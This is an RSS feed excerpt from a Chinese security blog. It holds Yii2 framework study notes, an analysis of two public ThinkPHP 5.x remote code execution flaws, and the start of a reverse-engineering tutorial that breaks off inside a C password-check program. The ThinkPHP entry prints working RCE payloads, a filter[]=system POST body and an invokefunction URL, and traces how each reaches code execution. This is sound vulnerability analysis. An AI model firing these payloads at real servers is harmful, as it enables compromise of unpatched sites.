现在如果请求为 http://hostname/index.php?r=post/view&amp;amp;id[]=123, 参数 $id 会使用数组值 ['123']， 如果请求为 http://hostname/index.php?r=post/view&amp;amp;id=123， 参数 $id 会获取相同数组值，因为无类型的 '123' 会自动转成数组。
&lt;/code>&lt;/pre>&lt;h2 id="控制器生命周期">控制器生命周期&lt;/h2>
&lt;p>处理一个请求时，应用主体 会根据请求 路由创建一个控制器， 控制器经过以下生命周期来完成请求：&lt;/p>
&lt;ol>
&lt;li>在控制器创建和配置后，yii\base\Controller::init() 方法会被调用。&lt;/li>
&lt;li>控制器根据请求操作ID创建一个操作对象:
&lt;ul>
&lt;li>如果操作ID没有指定，会使用default action ID默认操作ID；&lt;/li>
&lt;li>如果在action map找到操作ID， 会创建一个独立操作；&lt;/li>
&lt;li>如果操作ID对应操作方法，会创建一个内联操作；&lt;/li>
&lt;li>否则会抛出yii\base\InvalidRouteException异常。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>控制器按顺序调用应用主体、模块（如果控制器属于模块）、 控制器的 beforeAction() 方法；
&lt;ul>
&lt;li>如果任意一个调用返回false，后面未调用的beforeAction()会跳过并且操作执行会被取消； action execution will be cancelled.&lt;/li>
&lt;li>默认情况下每个 beforeAction() 方法会触发一个 beforeAction 事件，在事件中你可以追加事件处理操作；&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>控制器执行操作:
&lt;ul>
&lt;li>请求数据解析和填入到操作参数；&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>控制器按顺序调用控制器、模块（如果控制器属于模块）、应用主体的 afterAction() 方法；
&lt;ul>
&lt;li>默认情况下每个 afterAction() 方法会触发一个 afterAction 事件， 在事件中你可以追加事件处理操作；&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>应用主体获取操作结果并赋值给响应.&lt;/li>
&lt;/ol>
&lt;p>注： 在设计良好的应用中，控制器很精炼，包含的操作代码简短；如果你的控制器很复杂，通常意味着需要重构，转移一些代码到其它类中。&lt;/p>
&lt;p>归纳起来，控制器&lt;/p>
&lt;ul>
&lt;li>可访问请求数据&lt;/li>
&lt;li>可根据请求数据调用 模型 的方法和其它服务组件&lt;/li>
&lt;li>可使用视图构造响应&lt;/li>
&lt;li>不应处理应被模型处理的请求数据&lt;/li>
&lt;li>应避免嵌入HTML或其它展示代码，这些代码最好在视图中处理。&lt;/li>
&lt;/ul>
&lt;h1 id="模型">模型&lt;/h1>
&lt;p>模型是MVC模式中的一部分，代表了业务数据、规则和逻辑的对象。&lt;/p>
&lt;p>可通过继承 yii\base\Model 或 它的子类定义模型类，基类 yii\base\Model 支持许多实用的特性：&lt;/p>
&lt;ul>
&lt;li>属性: 代表可像普通类属性或数组 一样被访问的业务数据;&lt;/li>
&lt;li>属性标签: 指定属性显示出来的标签;&lt;/li>
&lt;li>块赋值: 支持一步给许多属性赋值;&lt;/li>
&lt;li>验证规则: 确保输入数据符合所申明的验证规则;&lt;/li>
&lt;li>数据导出: 允许模型数据导出为自定义格式的数组。&lt;/li>
&lt;/ul>
&lt;h2 id="块赋值">块赋值&lt;/h2>
&lt;p>块赋值只用一行代码将用户所有输入填充到一个模型，非常方便，它直接将输入数据对应填充到 &lt;code>yii\base\Model::attributes()&lt;/code> 属性。&lt;/p>
&lt;pre tabindex="0">&lt;code>$model = new \app\models\ContactForm;
$model-&amp;gt;attributes = \Yii::$app-&amp;gt;request-&amp;gt;post('ContactForm'); # ContactForm是定义好的模型名称
&lt;/code>&lt;/pre>&lt;h2 id="practice">PRACTICE&lt;/h2>
&lt;p>模型是代表业务数据、规则和逻辑的中心地方，通常在很多地方重用，在一个设计良好的应用中，模型通常比&lt;strong>控制器&lt;/strong>代码多。&lt;/p>
&lt;p>关于Yii的模型：&lt;/p>
&lt;ul>
&lt;li>可包含属性来展示业务数据;&lt;/li>
&lt;li>可包含验证规则确保数据有效和完整;&lt;/li>
&lt;li>可包含方法实现业务逻辑;&lt;/li>
&lt;li>不应直接访问请求，session和其他环境数据， 这些数据应该由控制器传入到模型;&lt;/li>
&lt;li>应避免嵌入HTML或其他展示代码，这些代码最好在 视图中处理;&lt;/li>
&lt;li>单个模型中避免太多的场景&lt;/li>
&lt;/ul>
&lt;p>在开发大型复杂系统时应经常考虑最后一条建议， 在这些系统中，模型会很大并在很多地方使用，因此会包含需要规则集和业务逻辑， 最后维护这些模型代码成为一个噩梦， 因为一个简单修改会影响好多地方， 为确保模型好维护，最好使用以下策略：&lt;/p>
&lt;ul>
&lt;li>定义可被多个 应用主体 或 模块 共享的模型基类集合。 这些模型类应包含通用的最小规则集合和逻辑。&lt;/li>
&lt;li>在每个使用模型的 应用主体 或 模块中， 通过继承对应的模型基类来定义具体的模型类， 具体模型类包含应用主体或模块指定的规则和逻辑。&lt;/li>
&lt;/ul>
&lt;p>例如，在高级应用模板， 你可以定义一个模型基类&lt;code>common\models\Post&lt;/code>， 然后在前台应用中，定义并使用一个继承&lt;code>common\models\Post&lt;/code>的具体模型类&lt;code>frontend\models\Post&lt;/code>， 在后台应用中可以类似地定义&lt;code>backend\models\Post&lt;/code>。 通过这种策略，你清楚&lt;code>frontend\models\Post&lt;/code>只对应前台应用，如果你修改它， 就无需担忧修改会影响后台应用。&lt;/p>
&lt;h1 id="视图-1">视图&lt;/h1>
&lt;h2 id="组织视图">组织视图&lt;/h2>
&lt;ul>
&lt;li>控制器渲染的视图文件默认放在 &lt;code>@app/views/ControllerID&lt;/code> 目录下， 其中 &lt;code>ControllerID&lt;/code> 对应 控制器 ID, 例如控制器类为 &lt;code>PostController&lt;/code>，视图文件目录应为 &lt;code>@app/views/post&lt;/code>， 控制器类 &lt;code>PostCommentController&lt;/code>对应的目录为 &lt;code>@app/views/post-comment&lt;/code>， 如果是模块中的控制器，目录应为 &lt;code>module directory&lt;/code> 模块目录下的 &lt;code>views/ControllerID&lt;/code> 目录；&lt;/li>
&lt;li>对于 小部件 渲染的视图文件默认放在 &lt;code>WidgetPath/views&lt;/code> 目录， 其中 &lt;code>WidgetPath&lt;/code> 代表小部件类文件所在的目录；&lt;/li>
&lt;/ul>
&lt;h2 id="渲染视图">渲染视图&lt;/h2>
&lt;pre tabindex="0">&lt;code>namespace app\controllers;
use Yii;
use app\models\Post;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
class PostController extends Controller
{
public function actionView($id)
{
$model = Post::findOne($id);
if ($model === null) {
throw new NotFoundHttpException;
}
// 渲染一个名称为&amp;quot;view&amp;quot;的视图并使用布局
return $this-&amp;gt;render('view', [
'model' =&amp;gt; $model,
]);
}
}
&lt;/code>&lt;/pre>&lt;h2 id="practice-1">PRACTICE&lt;/h2>
&lt;p>视图负责将模型的数据展示用户想要的格式，总之，视图&lt;/p>
&lt;ul>
&lt;li>应主要包含展示代码，如HTML, 和简单的PHP代码来控制、格式化和渲染数据；&lt;/li>
&lt;li>不应包含执行数据查询代码，这种代码放在模型中；&lt;/li>
&lt;li>应避免直接访问请求数据，如 $_GET, $_POST，这种应在控制器中执行， 如果需要请求数据，应由控制器推送到视图。&lt;/li>
&lt;li>可读取模型属性，但不应修改它们。&lt;/li>
&lt;/ul>
&lt;p>为使模型更易于维护，避免创建太复杂或包含太多冗余代码的视图， 可遵循以下方法达到这个目标：&lt;/p>
&lt;ul>
&lt;li>使用&lt;strong>布局&lt;/strong>来展示公共代码（如，页面头部、尾部）；&lt;/li>
&lt;li>将复杂的视图分成几个小视图，可使用上面描述的渲染方法将这些小视图渲染并组装成大视图；&lt;/li>
&lt;li>创建并使用&lt;strong>小部件&lt;/strong>作为视图的数据块；&lt;/li>
&lt;li>创建并使用助手类在视图中转换和格式化数据。&lt;/li>
&lt;/ul>
&lt;h1 id="模块">模块&lt;/h1>
&lt;h2 id="practice-2">PRACTICE&lt;/h2>
&lt;p>模块在大型项目中常备使用，这些项目的特性可分组， 每个组包含一些强相关的特性， 每个特性组可以做成一个模块由特定的开发人员和开发组来开发和维护。&lt;/p>
&lt;p>在特性组上，使用模块也是重用代码的好方式， 一些常用特性，如用户管理，评论管理，可以开发成模块， 这样在相关项目中非常容易被重用。&lt;/p>
&lt;h1 id="请求处理重点">请求处理（重点）&lt;/h1>
&lt;p>这块的逻辑我感觉是重点，值得一看&lt;/p>
&lt;h2 id="启动引导bootstrapping">启动引导（Bootstrapping）&lt;/h2>
&lt;p>启动引导指在应用开始解析并处理新接受请求之前，一个预先准备环境的过程。 启动引导会在两个地方具体进行：&lt;strong>入口脚本（Entry Script）&lt;/strong> 和 &lt;strong>应用主体（application）&lt;/strong>&lt;/p>
&lt;p>在&lt;strong>入口脚本&lt;/strong>里，需注册各个类库的类文件自动加载器（Class Autoloader），主要包括通过其autoload.php文件加载的Composer自动加载器，以及通过Yii类加载的Yii自动加载器。 之后，入口脚本会加载应用的配置并创建一个应用主体的实例。&lt;/p>
&lt;p>在应用主体的构造函数中，会执行以下引导工作：&lt;/p>
&lt;ol>
&lt;li>调用 preInit()（预初始化）方法，配置一些高优先级的应用属性， 比如 basePath 属性。&lt;/li>
&lt;li>注册错误处理器（ErrorHandler）。&lt;/li>
&lt;li>通过给定的应用配置初始化应用的各属性。&lt;/li>
&lt;li>通过调用 init()（初始化）方法，它会顺次调用 bootstrap() 从而运行引导组件。
&lt;ul>
&lt;li>加载扩展清单文件(extension manifest file) vendor/yiisoft/extensions.php。&lt;/li>
&lt;li>创建并运行各个扩展声明的 引导组件（bootstrap components）。&lt;/li>
&lt;li>创建并运行各个 应用组件 以及在应用的 Bootstrap 属性中声明的各个 模块（modules）组件（如果有）。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="路由-1">路由&lt;/h2>
&lt;p>当入口脚本在调用 &lt;code>run()&lt;/code> 方法时，它进行的第一个操作就是解析输入的请求，然后实例化对应的控制器动作处理这个请求。 该过程就被称为&lt;strong>引导路由（routing）&lt;/strong>。 路由相反的操作会将给定的路由和参数生成一个可访问的URL地址， 这个操作叫做创建URL。 创建出来的URL被请求的时候，路由处理器可以解析成原始的路由信息和参数。&lt;/p>
&lt;p>负责路由解析和创建URL的组件是 URL管理器, URL管理器在程序组件中被注册成 urlManager。 URL管理器 提供方法 parseRequest() 来 解析请求的URL并返回路由信息和参数， 方法 createUrl() 用来根据提供的路由和参数创建一个可访问的URL。&lt;/p>
&lt;p>urlManager可以配置路由格式&lt;/p>
&lt;ol>
&lt;li>
&lt;p>URL格式化&lt;/p>
&lt;p>URL管理器提供两种URL格式：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>默认URL格式；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>美化URL格式。&lt;/p>
&lt;p>默认URL格式使用一个参数r表示路由， 并且使用一般的参数格式表示请求参数。例如，&lt;code>/index.php?r=post/view&amp;amp;id=100&lt;/code>表示路由为&lt;code>post/view&lt;/code>，参数id为100。 默认URL格式不需要为URL管理器做任何配置， 并且在任何Web服务器都可以正常使用。&lt;/p>
&lt;p>美化URL格式在脚本名称后面使用更多的路径信息表示路由和参数信息。 例如，用适当的URL规则，&lt;code>/index.php/post/100&lt;/code>中附加的路径信息&lt;code>/post/100&lt;/code>表示 路由为&lt;code>post/view&lt;/code>，参数id为100。 要使用美化的URL格式，你需要根据实际的需求 设计一组URL规则来规定URL的样式。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>路由&lt;/p>
&lt;p>路由处理包含两个步骤：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>请求被解析成一个路由和关联的参数；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>路由相关的一个控制器动作被创建出来处理这个请求。&lt;/p>
&lt;p>如果使用默认URL格式，解析请求到路由只是简单的从GET请求中得到命名为r的参数。&lt;/p>
&lt;p>当使用用美化URL格式时，URL管理器将检查注册的URL规则， 找到一条可以匹配的将请求转到路由的规则。 如果找不到任何匹配的规则，系统将抛出&lt;code>yii\web\NotFoundHttpException&lt;/code>异常。&lt;/p>
&lt;p>一旦请求解析成路由，系统将马上根据路由信息创建一个控制器动作。 路由信息根据 &lt;code>/（正斜杠）&lt;/code>分解成多个部分。例如，&lt;code>site/index&lt;/code>将被分解成&lt;code>site&lt;/code>和&lt;code>index&lt;/code>两部分。 每个部分都可能被认为是一个模块、控制器或动作的ID。 从路由的第一个部分开始，系统将执行以下步骤创建所需模块（如果有模块的话）、控制器和动作：&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>设置应用系统作为当前的模块。&lt;/li>
&lt;li>检查当前模块中的控制器映射是否存在当前ID。 如果存在，根据控制器映射中的定义创建一个控制器实例， 跳到步骤5处理路由剩下的部分。&lt;/li>
&lt;li>检查ID是否为当前模块下modules定义的子模块 如果是，创建对应子模块， 跳到步骤2使用刚创建的子模块处理路由下一部分。&lt;/li>
&lt;li>将ID作为一个控制器ID并创建一个控制器实例， 并用来处理路由剩下的部分。&lt;/li>
&lt;li>控制器在自己的动作映射中查找当前ID。 如果找到，根据映射中的定义创建一个动作。 如果没找到，控制器将尝试根据动作ID定义的动作方法创建一个行内动作。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>缺省路由&lt;/p>
&lt;p>可以在应用配置中设置缺省值&lt;/p>
&lt;/li>
&lt;li>
&lt;p>创建URL&lt;/p>
&lt;p>Yii提供了一个助手方法yii\helpers\Url::to()，用来根据提供的路由和参数创建各种各样的URL。 例如：&lt;/p>
&lt;pre tabindex="0">&lt;code>use yii\helpers\Url;
// 创建一个普通的路由URL：/index.php?r=post%2Findex
echo Url::to(['post/index']);
// 创建一个带路由参数的URL：/index.php?r=post%2Fview&amp;amp;id=100
echo Url::to(['post/view', 'id' =&amp;gt; 100]);
// 创建一个带锚定的URL：/index.php?r=post%2Fview&amp;amp;id=100#content
echo Url::to(['post/view', 'id' =&amp;gt; 100, '#' =&amp;gt; 'content']);
// 创建一个绝对路径URL：http://www.example.com/index.php?r=post%2Findex
echo Url::to(['post/index'], true);
// 创建一个带https协议的绝对路径URL：https://www.example.com/index.php?r=post%2Findex
echo Url::to(['post/index'], 'https');
&lt;/code>&lt;/pre>&lt;p>方法&lt;code>yii\helpers\Url::to()&lt;/code>传入的路由是上下文相关的。 根据以下规则确认传入的路由是一个相对的路由还是绝对的路由：&lt;/p>
&lt;ul>
&lt;li>如果路由是一个空字符串，则使用当前请求的路由；&lt;/li>
&lt;li>如果路由中不存在/，则被认为是一个当前控制器下的动作ID， 且路由被附加到当前控制器的唯一ID后面；&lt;/li>
&lt;li>如果路由不以/开头，被认为是当前模块下的路由， 路由将被附加到当前模块的唯一ID后面。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>命名参数&lt;/p>
&lt;p>一条URL规则可以对匹配模式中的参数设置格式为 &lt;code>&amp;lt;ParamName:RegExp&amp;gt;&lt;/code> 的命名， 其中 &lt;code>ParamName&lt;/code> 指定参数的名称，&lt;code>RegExp&lt;/code> 是可选的用来匹配参数值得正则表达式。 如果没有设置 &lt;code>RegExp&lt;/code>，表示参数值为不包含 &lt;code>/&lt;/code> 的字符串。&lt;/p>
&lt;p>当一条规则用来匹配&lt;code>URL&lt;/code>时，符合匹配规则的相关的参数值被填充到规则中， 并且这些参数可以在 &lt;code>request&lt;/code> 组件中使用 &lt;code>$_GET&lt;/code> 获取到。 当规则用来创建 &lt;code>URL&lt;/code> 时， 提供的参数值将被插入到规则定义的指定位置。&lt;/p>
&lt;p>让我们使用一些例子来说明命名参数是如何工作的。假设我们定义了以下三条 &lt;code>URL&lt;/code> 规则：&lt;/p>
&lt;pre tabindex="0">&lt;code>[
'posts/&amp;lt;year:\d{4}&amp;gt;/&amp;lt;category&amp;gt;' =&amp;gt; 'post/index',
'posts' =&amp;gt; 'post/index',
'post/&amp;lt;id:\d+&amp;gt;' =&amp;gt; 'post/view',
]
&lt;/code>&lt;/pre>&lt;p>当规则用来解析 &lt;code>URL&lt;/code> 时：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>根据第二条规则，&lt;code>/index.php/posts&lt;/code> 被解析成路由 &lt;code>post/index&lt;/code>；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>根据第一条规则，&lt;code>/index.php/posts/2014/php&lt;/code> 被解析成路由 &lt;code>post/index&lt;/code>， 参数 &lt;code>year&lt;/code> 的值是 &lt;code>2014&lt;/code>，参数 &lt;code>category&lt;/code> 的值是 &lt;code>php&lt;/code>；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>根据第三条规则，&lt;code>/index.php/post/100&lt;/code> 被解析成路由 &lt;code>post/view&lt;/code>， 参数 &lt;code>id&lt;/code> 的值是 &lt;code>100&lt;/code>；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当&lt;code>yii\web\UrlManager::$enableStrictParsing&lt;/code> 设置为 &lt;code>true&lt;/code> 时，&lt;code>/index.php/posts/php&lt;/code> 将导致一个&lt;code>yii\web\NotFoundHttpException&lt;/code> 异常， 因为无法匹配任何规则。如果 &lt;code>yii\web\UrlManager::$enableStrictParsing&lt;/code> 设为 &lt;code>false&lt;/code>（默认值）， 路径部分 &lt;code>posts/php&lt;/code> 将被作为路由。&lt;/p>
&lt;p>当规则用来生成 URL 时：&lt;/p>
&lt;/li>
&lt;li>
&lt;p>根据第二条规则 Url::to([‘post/index’]) 生成 /index.php/posts；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>根据第一条规则 Url::to([‘post/index’, ‘year’ =&amp;gt; 2014, ‘category’ =&amp;gt; ‘php’]) 生成 /index.php/posts/2014/php；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>根据第三条规则 Url::to([‘post/view’, ‘id’ =&amp;gt; 100]) 生成 /index.php/post/100；&lt;/p>
&lt;/li>
&lt;li>
&lt;p>根据第三条规则 Url::to([‘post/view’, ‘id’ =&amp;gt; 100, ‘source’ =&amp;gt; ‘ad’]) 生成 /index.php/post/100?source=ad。 因为参数 source 在规则中没有指定，将被作为普通请求参数附加到生成的 URL 后面。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Url::to([‘post/index’, ‘category’ =&amp;gt; ‘php’]) 生成 /index.php/post/index?category=php。 注意因为没有任何规则适用，将把路由信息当做路径信息来生成URL， 并且所有参数作为请求查询参数附加到 URL 后面。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="practice-3">PRACTICE&lt;/h2>
&lt;pre tabindex="0">&lt;code>在开发复杂的 Web 应用程序时，优化 URL 规则非常重要，以便解析请求和创建 URL 所需 的时间更少。
通过使用参数化路由，您可以减少 URL 规则的数量，这可以显著提高性能。
当解析或创建URL时，URL manager 按照它们声明的顺序检查 URL 规则。 因此，您可以考虑调整 URL 规则的顺序，以便在较少使用的规则之前放置更具体和/或更常用的规则。
如果多个 URL 规则使用相同的前缀，你可以考虑使用 yii\web\GroupUrlRule， 这样作为一个组合，URL管理器会更高效。 特别是当应用程序由模块组合而成时，每个模块都有各自的 URL 规则且都有各自的模块 ID 作为前缀。
&lt;/code>&lt;/pre>&lt;h1 id="关于安装搭建测试环境">关于安装搭建测试环境&lt;/h1>
&lt;p>没想到这个也要费点篇幅，那我们先开始搭建吧&lt;/p>
&lt;ol>
&lt;li>
&lt;p>在github上找到对应的release版本，我们以2.0.4为例&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/JdTclLe.png" alt="img" />&lt;/p>
&lt;p>下载 两个文件，&lt;code>yii-advanced-app-2.0.4.tgz&lt;/code> 和 &lt;code>yii-basic-app-2.0.4.tgz&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>解压basic到web目录&lt;/p>
&lt;/li>
&lt;li>
&lt;p>解压advanced并覆盖之前basic中的内容&lt;/p>
&lt;/li>
&lt;li>
&lt;p>配置 config/web.php中的cookieValidationKey&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/76q2XKU.png" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>测试安装是否成功，输入URL&lt;/p>
&lt;blockquote>
&lt;p>http://localhost/yii2/web/index.php&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://i.imgur.com/zIAOMty.png" alt="img" />&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>ThinkPHP 漏洞总结</title><link>https://sera.wang/p/thinkphp-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</link><pubDate>Sat, 02 Feb 2019 21:14:23 +0800</pubDate><guid>https://sera.wang/p/thinkphp-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</guid><description>&lt;p>对已经公开的tp漏洞的分析总结&lt;/p>
&lt;h1 id="2019111-thinkphp-5005023-rce漏洞">2019/1/11 thinkphp 5.0.0~5.0.23 RCE漏洞&lt;/h1>
&lt;p>payload:&lt;/p>
&lt;blockquote>
&lt;p>http://localhost:89/index.php?s=captcha&lt;/p>
&lt;/blockquote>
&lt;p>post:&lt;/p>
&lt;blockquote>
&lt;p>_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=whoami&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://i.imgur.com/X7igLUm.png" alt="img" />&lt;/p>
&lt;p>在thinkphp中，访问index.php，会调用App.php中的run方法&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zePr6tz.png" alt="img" />&lt;/p>
&lt;p>其中，会调用routeCheck方法检测路由信息，跟进&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/x1ulDuX.png" alt="img" />&lt;/p>
&lt;p>此处，会调用check方法检测路由，跟进&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/UmmOw6V.png" alt="img" />&lt;/p>
&lt;p>857行调用了request类的method方法，跟进&lt;/p>
&lt;p>这处就比较关键了，我们发现，此method方法如果post了一个伪装变量 &lt;code>_method&lt;/code> 就可以调用request类的任意方法，并且参数传递的是$_POST数组。&lt;/p>
&lt;p>config设置中的默认伪装变量为_method&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/W9ao6Il.png" alt="img" />&lt;/p>
&lt;p>然后我们看看payload是如何构造并实现的。&lt;/p>
&lt;h1 id="payload">&lt;strong>PAYLOAD&lt;/strong>&lt;/h1>
&lt;p>再看看payload，即post过去的数组&lt;/p>
&lt;blockquote>
&lt;p>_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;get[]=whoami&lt;/p>
&lt;/blockquote>
&lt;p>通过上文可知，tp会调用 伪装变量&lt;code>_method&lt;/code>的值即&lt;code>__construct&lt;/code>方法，参数是$_POST数组&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/kvoHXqr.png" alt="img" />&lt;/p>
&lt;p>我们可以看到，在这个__construct方法其实只过了一件事情，就是在第一个foreach循环里将POST数组，赋值给了$this-&amp;gt;$name这个可变变量。&lt;/p>
&lt;p>接下来，我们一步步继续后，跑完了method，跑完了check，跑完了routeCheck，我们回到App.php的run方法。&lt;/p>
&lt;p>此处dispatch值会是method，这里不是特别清楚。 看到说是因为vendor/topthink/think-captcha/src/helper.php中配置了路由。&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/0fLqL8k.png" alt="img" />&lt;/p>
&lt;p>继续往下看，执行了exec方法，跟进&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/9SHEy3y.png" alt="img" />&lt;/p>
&lt;p>这里因为dispatch是method，所以到case method处继续执行代码，跟进param()&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/SDzt2E9.png" alt="img" />&lt;/p>
&lt;p>重点关注$this-&amp;gt;param变量，它是空值，但是在红框处，通过一个array_merge，将$this-&amp;gt;get(false)，即$this-&amp;gt;get的值赋给了$this-&amp;gt;param变量。也即用户输入直接传递给了$this-&amp;gt;param&lt;/p>
&lt;p>再跟进末尾 return的input方法，我们继续跟进。&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zGhDKKD.png" alt="img" />&lt;/p>
&lt;p>1028行的getFilter会将$this-&amp;gt;filter，即我们之前的输入赋给filter变量，最后在1034行调用filterValue，跟进&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/kdYraIA.png" alt="img" />&lt;/p>
&lt;p>这里会遍历filter，如果它是一个可用方法，则会调用它，而它的确是的，这里$filter的值是 system，$value的值是 whoami，代码执行成功。&lt;/p>
&lt;h1 id="2018129-thinkphp-5x-全版本-任意代码执行漏洞">2018/12/9 thinkphp 5.x 全版本 任意代码执行漏洞&lt;/h1>
&lt;p>官方12.9 github上发布了修复代码，对controller类进行过滤&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/m9CiMHl.png" alt="img" />&lt;/p>
&lt;p>payload:&lt;/p>
&lt;blockquote>
&lt;p>http://localhost:89/index.php?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1&lt;/p>
&lt;/blockquote>
&lt;p>下面从App.php的run方法开始分析&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/kr736rs.png" alt="img" />&lt;/p>
&lt;p>我们跟进routeCheck&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/WvN3sCM.png" alt="img" />&lt;/p>
&lt;p>这里关键的是两个方法，我们先跟进第一个path&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/VvdUXw6.png" alt="img" />&lt;/p>
&lt;p>这里pathinfo方法会将默认的兼容模式值s赋给$pathinfo并返回。 即 path方法最终会获取到 GET提交的s参数值&lt;/p>
&lt;p>之后跟进check方法&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/gBOvsAu.png" alt="img" />&lt;/p>
&lt;p>最关键的是return处，它最终会调用think\route\dispatch\Url.php的初始化方法，跟进&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/jKqfkja.png" alt="img" />&lt;/p>
&lt;p>关键代码有两行，跟进parseUrl方法&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/lMVVfzS.png" alt="img" />&lt;/p>
&lt;p>这里会对刚才获取的path进行处理，parseUrlPath方法，会根据正斜杠对path进行切割，然后返回切割的数组&lt;/p>
&lt;p>然后tp会按顺序，pop刚才获取的path数组，依次得到$module，$controller，和$action的值&lt;/p>
&lt;p>在parseUrl这个方法里，接下来还会获取其它提交的参数。&lt;/p>
&lt;p>最后将module,controller,action封装并返回&lt;/p>
&lt;p>从parseUrl出来后，我们继续看刚才的第二个关键方法，就是Module类的初始化init方法，跟进&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/4tDPrA0.png" alt="img" />&lt;/p>
&lt;p>这里没有对controller做什么过滤，返回后，&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/fsGwemq.png" alt="img" />&lt;/p>
&lt;p>这里通过中间件一路执行，一直到最关键的Module类的exec方法，&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/LpuomOw.png" alt="img" />&lt;/p>
&lt;p>跟进controller方法&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/kPeRESZ.png" alt="img" />&lt;/p>
&lt;p>跟进parseModule方法&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/LkFlUvx.png" alt="img" />&lt;/p>
&lt;p>因为存在反斜杠，所以直接返回类名，从而直接创建了任意可控实例 \think\container&lt;/p>
&lt;p>接下来看payload是如何构造的。&lt;/p>
&lt;h1 id="payload-1">PAYLOAD&lt;/h1>
&lt;p>再复习一下payload&lt;/p>
&lt;blockquote>
&lt;p>http://localhost:89/index.php?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=phpinfo&amp;amp;vars[1][]=1&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://i.imgur.com/onJWIZh.png" alt="img" />&lt;/p>
&lt;p>就在exec方法中，获取到了我们可控的 \think\container实例以及GET传递的方法和参数后，调用了invokeReflectMethod方法，跟进&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/ggdxLlP.png" alt="img" />&lt;/p>
&lt;p>最终通过调用invokeArgs方法，任意代码执行成功。&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/q6pyLQq.png" alt="img" />&lt;/p>
&lt;p>成功调用 \think\container类的invokeFunction方法，&lt;/p>
&lt;p>最后的代码调用相当于&lt;/p>
&lt;pre tabindex="0">&lt;code>call_user_func_array(&amp;quot;call_user_func_array&amp;quot;,[&amp;quot;phpinfo&amp;quot;,[1]]);
&lt;/code>&lt;/pre></description></item><item><title>入门逆向</title><link>https://sera.wang/p/%E5%85%A5%E9%97%A8%E9%80%86%E5%90%91/</link><pubDate>Mon, 19 Nov 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E5%85%A5%E9%97%A8%E9%80%86%E5%90%91/</guid><description>&lt;p>我想成为魔法师！ 这个逆向专题用来记录自己学习逆向魔法的过程。&lt;/p>
&lt;h2 id="关于魔法">关于魔法&lt;/h2>
&lt;p>有人问教主: “ 现在都是win10了，win7连debug都没有，学习汇编有什么用，对于手机app开发有什么帮助？ “&lt;/p>
&lt;p>教主:&lt;/p>
&lt;blockquote>
&lt;p>“ 学习魔法辛苦又困难， 而且似乎对当个铁匠、农夫、牧羊人也毫无帮助。 “ ———— 2016-01-18&lt;/p>
&lt;/blockquote>
&lt;p>作为入门篇，这次逆向的是一个小pe，目标是改变它的执行逻辑，从而达到我们想要的效果（比如破解）。&lt;/p>
&lt;h2 id="用c写一个小程序">用C写一个小程序&lt;/h2>
&lt;p>crack.c 代码如下:&lt;/p>
&lt;pre tabindex="0">&lt;code>#include &amp;lt;stdio.h&amp;gt;
#define PASSWORD &amp;quot;1234567&amp;quot;
int verify_password(char *password){
int authenticated;
authenticated = strcmp(password,PASSWORD);
return authenticated;
}
main(){
int valid_flag = 0;
char password[1024];
while(1){
printf(&amp;quot;please input password: &amp;quot;);
